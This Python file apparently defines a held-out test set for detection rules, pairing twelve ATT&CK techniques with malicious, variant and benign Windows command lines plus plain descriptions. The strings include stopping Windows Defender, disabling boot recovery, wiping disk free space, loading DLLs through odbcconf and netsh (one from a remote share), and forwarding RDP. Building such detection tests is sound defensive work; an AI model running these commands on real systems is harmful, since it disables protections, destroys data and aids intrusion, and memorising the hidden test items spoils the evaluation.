"""
Test set 2: 12 new techniques, kept locked until the prompt is frozen.
Each technique has:
  malicious : shown to the model (like an IOC in a CTI report)
  variant   : hidden from the model, same attack with different arguments
  benign    : hidden, a harmless use of the same program
"""
import os, sys
sys.path.insert(0, os.path.dirname(__file__))
from generate import build_event

SYS32 = "C:\\Windows\\System32\\"

TECHNIQUES2 = {
    "T1218.001": dict(
        image="C:\\Windows\\hh.exe",
        malicious=r"hh.exe http://10.0.0.5/help.chm",
        variant=r"hh.exe https://files.example.net/doc.chm",
        benign=r"hh.exe C:\Users\student\Documents\manual.chm"),
    "T1021.002": dict(
        image=SYS32 + "net.exe",
        malicious=r"net.exe use \\10.0.0.5\C$ /user:admin Passw0rd",
        variant=r"net.exe use X: \\FILESRV\ADMIN$ /persistent:yes",
        benign=r"net.exe use Z: \\FILESRV\Projects"),
    "T1560.001": dict(
        image=r"C:\Program Files\WinRAR\rar.exe",
        malicious=r"rar.exe a -hpSecret123 C:\Temp\data.rar C:\Users\student\Documents",
        variant=r"rar.exe a -m5 -hpP@ssw0rd out.rar *.docx",
        benign=r"rar.exe a C:\Temp\backup.rar C:\Users\student\Documents"),
    "T1222.001": dict(
        image=SYS32 + "takeown.exe",
        malicious=r"takeown.exe /f C:\Windows\System32\config /r /d y",
        variant=r"takeown.exe /R /F D:\Data\* /A",
        benign=r"takeown.exe /f C:\Users\student\notes.txt"),
    "T1489": dict(
        image=SYS32 + "net.exe",
        malicious=r'net.exe stop "Windows Defender Antivirus Service"',
        variant=r"net1.exe stop MSSQLSERVER /y",
        variant_image=SYS32 + "net1.exe",
        benign=r"net.exe start Spooler"),
    "T1482": dict(
        image=SYS32 + "dsquery.exe",
        malicious=r'dsquery.exe * -filter "(objectClass=trustedDomain)" -attr *',
        variant=r'dsquery.exe * -filter "(objectCategory=trustedDomain)"',
        benign=r'dsquery.exe user -name "J*"'),
    "T1218.008": dict(
        image=SYS32 + "odbcconf.exe",
        malicious=r"odbcconf.exe /S /A {REGSVR C:\Users\student\AppData\Local\Temp\payload.dll}",
        variant=r"odbcconf.exe -a {regsvr \\10.0.0.5\share\evil.dll}",
        benign=r'odbcconf.exe /S /A {CONFIGDSN "SQL Server" "DSN=Test"}'),
    "T1546.007": dict(
        image=SYS32 + "netsh.exe",
        malicious=r"netsh.exe add helper C:\Windows\Temp\evil.dll",
        variant=r"netsh add helper C:\Users\Public\h.dll",
        benign=r"netsh.exe interface show interface"),
    "T1090": dict(
        image=SYS32 + "netsh.exe",
        malicious=r"netsh.exe interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.9 connectport=3389",
        variant=r"netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.0.0.9",
        benign=r"netsh.exe interface portproxy show all"),
    "T1485": dict(
        image=SYS32 + "cipher.exe",
        malicious=r"cipher.exe /w:C:\Users\student",
        variant=r"cipher.exe /w:D:\Data",
        benign=r"cipher.exe /e C:\Users\student\secret"),
    "T1490": dict(
        image=SYS32 + "bcdedit.exe",
        malicious=r"bcdedit.exe /set {default} recoveryenabled no",
        variant=r"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        benign=r"bcdedit.exe /enum"),
    "T1059": dict(
        image=SYS32 + "forfiles.exe",
        malicious=r'forfiles.exe /p C:\Windows\System32 /m notepad.exe /c "cmd.exe /c calc.exe"',
        variant=r'forfiles.exe /p C:\Windows /m *.exe -c "powershell -nop -w hidden"',
        benign=r"forfiles.exe /p C:\Logs /s /m *.log"),
}

# What a CTI report would say, in plain words (no rule text).
DESCRIPTIONS2 = {
    "T1218.001": "hh.exe opens a help file from a remote web address.",
    "T1021.002": "A network share with an admin share name (ending in $) is mounted with net use.",
    "T1560.001": "WinRAR's rar command compresses files into an archive protected with a password.",
    "T1222.001": "takeown is used to take ownership of a whole folder and everything inside it.",
    "T1489":     "A Windows service is stopped from the command line.",
    "T1482":     "dsquery is used to list trust relationships between domains.",
    "T1218.008": "odbcconf is used to register and load a DLL file.",
    "T1546.007": "netsh is used to add a helper DLL, which loads every time netsh starts.",
    "T1090":     "netsh is used to forward traffic to the Remote Desktop port 3389.",
    "T1485":     "cipher is used to overwrite free disk space so deleted data cannot be recovered.",
    "T1490":     "bcdedit is used to turn off Windows recovery options.",
    "T1059":     "forfiles is used to run another command on each file it finds.",
}

def make_triple(tech):
    t = TECHNIQUES2[tech]
    vi = t.get("variant_image", t["image"])
    return (build_event(t["image"], t["malicious"]),
            build_event(vi, t["variant"]),
            build_event(t["image"], t["benign"]))